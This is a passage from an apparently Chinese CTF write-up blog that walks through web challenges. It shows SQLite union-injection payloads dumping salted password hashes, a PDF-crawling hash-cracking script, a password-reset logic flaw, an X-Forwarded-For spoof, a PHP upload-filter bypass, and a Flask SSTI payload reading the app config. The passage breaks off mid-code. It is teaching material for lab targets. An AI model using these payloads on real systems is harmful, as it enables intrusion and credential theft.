class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]))</span><br><span class="line">highlight_file(<span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>审计结果：</strong></p><ul><li>第8行的SQL查询语句的确存在注入，有name和password字段，存储的password为拼接并做SHA1的结果</li><li>存在id参数，利用查询结果生成Cookie，此处会产生回显</li><li>GET传参debug时，会输出login.php源码</li></ul><p>所以思路就比较明确了，利用SQL注入，查询admin账户的密码然后破解或碰撞。</p><p><strong>注入过程：</strong></p><p>根据审计结果，测试是否会有注入回显，当查询到结果时，就会设定Cookie，以存在的admin用户为例</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395530.png" alt="1604306380187.png"></p><p>通过是否有Set-Cookie字段，进行order by和union select联合查询，得到回显点是在查询结果的第2个字段</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395538.png" alt="1604306542142.png"></p><p>SQLite数据库中，存在一个sqlite_master默认表，类似于mysql中的information_schema，可以在sqlite_master中查询所有的表明以及之前执行过的创建表的sql语句，具体：</p><blockquote><p><strong>sqlite_master</strong> 表是 SQLite 的系统表。该表记录该数据库中保存的表、索引、视图、和触发器信息。每一行记录一个项目。在创建一个 SQLIite 数据库的时候，该表会自动创建。sqlite_master 表<strong>包含5列</strong>。</p><p><strong>type</strong>：记录了项目的类型，如 table、index、view、trigger 。</p><p><strong>name</strong>：记录了项目的名称，如表名、索引名等。</p><p><strong>tbl_name</strong>：记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身。</p><p><strong>rootpage</strong>：记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者 NULL 。</p><p><strong>sql</strong>：记录创建该项目的 SQL 语句。</p></blockquote><p>所以可构造的SQL语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> tbl_name <span class="keyword">from</span> sqlite_master <span class="comment">-- 查询表名</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master <span class="comment">-- 查询执行过的sql语句</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master <span class="keyword">where</span> type<span class="operator">=</span><span class="string">&#x27;table&#x27;</span> <span class="keyword">and</span> tbl_name<span class="operator">=</span><span class="string">&#x27;Users&#x27;</span> <span class="comment">-- 查询创建User表的SQL语句</span></span><br></pre></td></tr></table></figure><p>这样的话，就可以利用limit子句，逐个查询表名，再通过查询创建该表的sql语句得到其字段信息，已经查到了存在Users表，查询其字段信息：</p><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?usr<span class="operator">=</span><span class="string">&#x27;union select 1,sql from sqlite_master where type=&#x27;</span><span class="keyword">table</span><span class="string">&#x27; and tbl_name=&#x27;</span>Users<span class="string">&#x27; --+&amp;pw=aa&amp;id=1</span></span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395559.png" alt="1604307079546.png"></p><p>得到4个字段：id、name、password、hint</p><p>利用聚合函数<code>group_concat()</code>分别查询name、password和hint</p><p>payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?usr=&#x27; union select 1,group_concat(name,&quot;----&quot;) from Users --+&amp;pw=aa&amp;id=1</span><br><span class="line">?usr=&#x27; union select 1,group_concat(password,&quot;----&quot;) from Users --+&amp;pw=aa&amp;id=1</span><br><span class="line">?usr=&#x27; union select 1,group_concat(hint,&quot;----&quot;) from Users --+&amp;pw=aa&amp;id=1</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395567.png" alt="1604307326795.png"></p><p>统计查到的数据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">name:  admin</span><br><span class="line">password:  34b0bb7c304949f9ff2fc101eef0f048be10d3bd</span><br><span class="line">hint:  my+fav+word+in+my+fav+paper%3F%21</span><br><span class="line"></span><br><span class="line">fritze</span><br><span class="line">3fab54a50e770d830c0416df817567662a9dc85c</span><br><span class="line">my+love+is%E2%80%A6%3F</span><br><span class="line"></span><br><span class="line">hansi</span><br><span class="line">54eae8935c90f467427f05e4ece82cf569f89507</span><br><span class="line">the+password+is+password</span><br></pre></td></tr></table></figure><p>因为密码的散列值是加盐的，所以网上破解不出来，写了一个Python脚本对常用的2万个密码同样加盐做SHA1散列进行碰撞，没有得到结果。</p><p>hint提示密码就在那些pdf中，对<code>%E2%80%A6%3F</code>做URL解码后逐个pdf查询也没有得到结果。懵了，没办法，看一下师傅们的wp吧，得知需要爬取所有PDF，对其中的单词进行加盐SHA1做碰撞测试。</p><p>OK，自己撸代码吧，不用师傅们写好的了，毕竟也是学了一段时间Python的，而且之前给女盆友写英文PDF翻译工具时已经有一些轮子了，直接拿来用吧（小声bb：给小黑同学的翻译工具到现在还没写好，没有找到合适的翻译api）</p><p>大概花了1个半个小时写完。。。太慢了😓</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Cr4y0n</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Time    : 2020/11/2 17:26</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfdocument <span class="keyword">import</span> PDFDocument</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFTextExtractionNotAllowed</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> PDFPageAggregator</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在页面递归查找pdf文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findPDF</span>(<span class="params">url</span>):</span></span><br><span class="line">    re_pdf = <span class="string">&quot;[a-fA-F0-9]&#123;32&#125;.pdf&quot;</span></span><br><span class="line">    re_index = <span class="string">&quot;[0-9\/]&#123;1,5&#125;index.html&quot;</span></span><br><span class="line">    <span class="keyword">global</span> pdfList</span><br><span class="line">    rep = requests.get(url).text</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re.findall(re_pdf, rep):</span><br><span class="line">        pdfURL = url + i</span><br><span class="line">        pdfUrlList.append(pdfURL)</span><br><span class="line">        print(<span class="string">&quot;PDF：&quot;</span>, pdfURL)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re.findall(re_index, rep):</span><br><span class="line">        newURL = url + i[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">        findPDF(newURL)</span><br><span class="line"><span class="comment"># 下载pdf文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadFile</span>(<span class="params">urlList</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(<span class="string">&quot;pdf&quot;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&quot;pdf&quot;</span>)</span><br><span class="line">    os.chdir(<span class="string">&quot;./pdf&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urlList:</span><br><span class="line">        os.system(<span class="string">&quot;curl -O &quot;</span> + url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为txt</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Pdf2Text</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="comment"># 打开PDF文件</span></span><br><span class="line">    pdfFile = <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    <span class="comment"># 创建pdf文档分析器</span></span><br><span class="line">    parser = PDFParser(pdfFile)</span><br><span class="line">    <span class="comment"># 创建PDF文档对象存储文档结构</span></span><br><span class="line">    document = PDFDocument(parser)</span><br><span class="line">    <span class="comment"># 检查文件是否允许文本提取</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> document.is_extractable:</span><br><span class="line">        <span class="keyword">raise</span> PDFTextExtractionNotAllowed</span><br><span class="line">    <span class="comment"># 创建PDF资源管理器对象来存储共享资源</span></span><br><span class="line">    resource = PDFResourceManager()</span><br><span class="line">    <span class="comment"># 设定参数进行分析</span></span><br><span class="line">    laparams = LAParams()</span><br><span class="line">    <span class="comment"># 创建一个PDF设备对象</span></span><br><span class="line">    device = PDFPageAggregator(resource, laparams=laparams)</span><br><span class="line">    <span class="comment"># 创建一个PDF解释器对象</span></span><br><span class="line">    interpreter = PDFPageInterpreter(resource, device)</span><br><span class="line">    <span class="comment"># 创建存储转换结果的同名txt文件</span></span><br><span class="line">    fileName = <span class="built_in">str</span>(os.path.abspath(path).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    newFileName = fileName + <span class="string">&quot;.txt&quot;</span></span><br><span class="line">    f = <span class="built_in">open</span>(newFileName, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="comment"># 处理每一页</span></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.create_pages(document):</span><br><span class="line">        interpreter.process_page(page)</span><br><span class="line">        <span class="comment"># 接受该页面的LTPage对象</span></span><br><span class="line">        layout = device.get_result()</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> layout:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isinstance</span>(x, LTTextBoxHorizontal)):</span><br><span class="line">                <span class="comment"># 写入txt文件</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f.writelines(x.get_text() + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐个单词进行散列运算并查找匹配</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findPassword</span>(<span class="params">path</span>):</span></span><br><span class="line">    ls = [<span class="string">&quot;34b0bb7c304949f9ff2fc101eef0f048be10d3bd&quot;</span>, <span class="string">&quot;3fab54a50e770d830c0416df817567662a9dc85c&quot;</span>, <span class="string">&quot;54eae8935c90f467427f05e4ece82cf569f89507&quot;</span>]</span><br><span class="line">    wordList = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">            i = i.strip()</span><br><span class="line">            lineWordList = <span class="built_in">list</span>(i.split())</span><br><span class="line">            wordList += lineWordList</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> wordList:</span><br><span class="line">        i = i.strip(<span class="string">&quot;:&quot;</span>).strip(<span class="string">&quot;;&quot;</span>).strip(<span class="string">&quot;.&quot;</span>).strip(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">        en = sha1()</span><br><span class="line">        en.update((i + <span class="string">&quot;Salz!&quot;</span>).encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">        result = en.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> result <span class="keyword">in</span> ls:</span><br><span class="line">            print(i, <span class="string">&quot;\t&quot;</span>, result)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://220.249.52.133:30445/&quot;</span></span><br><span class="line">    pdfUrlList = []</span><br><span class="line">    findPDF(url)</span><br><span class="line">    print(pdfUrlList)</span><br><span class="line">    downloadFile(pdfUrlList)</span><br><span class="line">    pdfPathList = []</span><br><span class="line">    print(os.getcwd())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">&quot;.\\pdf\\&quot;</span>):</span><br><span class="line">        pdfPathList.append(<span class="string">&quot;.\\pdf\\&quot;</span> + i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pdfPathList:</span><br><span class="line">        Pdf2Text(i)</span><br><span class="line">        textFile = i[<span class="number">0</span>:-<span class="number">3</span>] + <span class="string">&quot;txt&quot;</span></span><br><span class="line">        findPassword(textFile)</span><br><span class="line">        print(<span class="string">&quot;File：&quot;</span> + textFile)</span><br></pre></td></tr></table></figure><p>运行脚本，当碰到正确的密码时自动终止</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395582.png" alt="1604316948660.png"></p><p>根据散列值得知是fritze账户，admin.php页面输入得到Flag：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395590.png" alt="1604316853076.png"></p><p>检索30多个PDF来找到密码，只能说大佬们的路子真的野~😌</p><h2 id="⭐-bug（任意用户密码重置-XFF伪造-文件上传）"><a href="#⭐-bug（任意用户密码重置-XFF伪造-文件上传）" class="headerlink" title="⭐ bug（任意用户密码重置+XFF伪造+文件上传）"></a>⭐ bug（任意用户密码重置+XFF伪造+文件上传）</h2><p>[redinfo title=”题目信息”]来源： RCTF-2015<br>难度：5星<br>考察：逻辑漏洞（任意用户密码重置）、参数猜测、XFF IP伪造、文件上传绕过（后缀解析、MIME、PHP脚本限制）[/redinfo]</p><p>比较发散，题目环境有以下功能点：登陆前（登录、注册、找回密码），登录后（管理、修改密码、个人信息、退出），管理界面需要admin权限</p><p>注册了一个aaa的用户，对登录、注册等功能SQL注入无果，但是在请求头的Cookie中有一个user的字段，对其值做MD5解密发现是<strong>5:aaa</strong>，其中5是aaade uid，尝试将user值改为admin相关的MD5散列进行越权，依然失败。</p><p>在找回密码处发现，当身份验证成功时，重置密码会在数据包中同时传入用户名和新密码，所以怀疑是重置密码相关的逻辑漏洞。</p><p>将用户名改为admin，成功修改admin的密码</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323687.png" alt="1604505334269.png"></p><p>登录admin账户查看manage界面，提示IP不允许，上ModHeader，老朋友了，将<strong>XFF修改为127.0.0.1</strong>，成功绕过IP校验</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323694.png" alt="1604505774592.png"></p><p>查看页面源码，发现提示：<code>&lt;!-- index.php?module=filemanage&amp;do=???--&gt;</code>，需要猜测do参数，是对文件进行管理，无非就是：<strong>download</strong>、<strong>upload</strong>、<strong>delete</strong>、<strong>read</strong>、<strong>write</strong>、<strong>move</strong>、<strong>copy</strong>，逐个试一下发现此处参数是upload，触发文件上传题目</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323701.png" alt="1604506183072.png"></p><p>经过不断上传尝试，发现系统会做文件后缀检测、MIME检测、PHP脚本文件检测（检测&lt;?php），但是又需要上传一个php木马，所以要同时绕过这三个检测。</p><p>当使用php5绕过后缀检测、修改MIME为image/png后，在php脚本文件监测处，当存在<code>&lt;?php</code>时提示<code>Something shows it is a php!</code>，当在？和php之间加一个空格<code>&lt;? php</code>时又提示<code>It is not a really php file</code></p><p>这就表明，不能够使用这种php脚本的写法，后台会检测到，题目考差的是php脚本的第二种写法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>phpinfo()<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将payload改为第二种写法，得到flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605323709.png" alt="1604506924276.png"></p><h2 id="⭐-shrine（SSTI-url-for-沙盒逃逸）"><a href="#⭐-shrine（SSTI-url-for-沙盒逃逸）" class="headerlink" title="⭐ shrine（SSTI+url_for()沙盒逃逸）"></a>⭐ shrine（SSTI+url_for()沙盒逃逸）</h2><p>题目给出了源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>shrine路径可成功进行SSTI</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332217.png" alt="1604051748466.png"></p><p>第5行使用<code>app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)</code>添加了一个全局配置，猜测就是flag</p><p>但是在12行定义了<code>safe_jinja()</code>来进行安全校验：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br></pre></td></tr></table></figure><p>首先删除()，然后定义黑名单，将config和self替换为None。</p><p>这道题如果没有过滤的话，可以直接**<code>&#123;&#123;config&#125;&#125;</code><strong>或</strong><code>&#123;&#123;self.__dict__&#125;&#125;</code>**，经查阅，除此之外还有其他的函数方法可以使用：</p><ul><li><p><strong>url_for()</strong><br><em>一般我们通过一个URL就可以执行到某一个函数。如果反过来，我们知道一个函数，怎么去获得这个URL呢？url_for函数就可以帮我们实现这个功能。url_for()函数接收两个及以上的参数，他接收函数名作为第一个参数，接收对应URL规则的命名参数，如果还出现其他的参数，则会添加到URL的后面作为查询参数。</em></p></li><li><p><strong>get_flashed_messages()</strong><br><em>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</em></p></li></ul><p>具体可参考：<br><a href="https://blog.csdn.net/houyanhua1/article/details/85470175">https://blog.csdn.net/houyanhua1/article/details/85470175</a><br><a href="https://blog.csdn.net/shuibuzhaodeshiren/article/details/86819537">https://blog.csdn.net/shuibuzhaodeshiren/article/details/86819537</a></p><p>首先利用url_for查看当前所有全局变量字典，发现了Flask</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332233.png" alt="1604053909419(1).png"></p><p>所以payload如下，即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&quot;current_app&quot;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332244.png" alt="1604054046849 (1).png"></p><p> get_flashed_messages的payload是一样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&quot;current_app&quot;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>参考</strong></p><p><a href="https://blog.csdn.net/qq_33020901/article/details/83036927">https://blog.csdn.net/qq_33020901/article/details/83036927</a></p><h2 id="⭐-Web2（程序逆向）"><a href="#⭐-Web2（程序逆向）" class="headerlink" title="⭐ Web2（程序逆向）"></a>⭐ Web2（程序逆向）</h2><p>出自NSCTF，题目页面给出了一段代码，如下：</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=strrev(<span class="variable">$str</span>);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;strlen(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=substr(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=ord(<span class="variable">$_c</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_c</span>=chr(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></code></pre><p>要求是逆向加密算法，解密$miwen就是flag，进行<strong>代码审计</strong>吧</p><p>程序其实就是自定义一个加密函数encode()，按步骤分析结果如下：</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=strrev(<span class="variable">$str</span>); <span class="comment">// 将$str反转（逆序）</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;strlen(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;  <span class="comment">// 遍历</span></span><br><span class="line">        <span class="variable">$_c</span>=substr(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>); <span class="comment">// $_c 等同于 $_o[$_0]</span></span><br><span class="line">        <span class="variable">$__</span>=ord(<span class="variable">$_c</span>)+<span class="number">1</span>;  <span class="comment">// $__ 等于 $_c的ascii值加1</span></span><br><span class="line">        <span class="variable">$_c</span>=chr(<span class="variable">$__</span>);  <span class="comment">// 再将 $__ 转为ascii字符</span></span><br><span 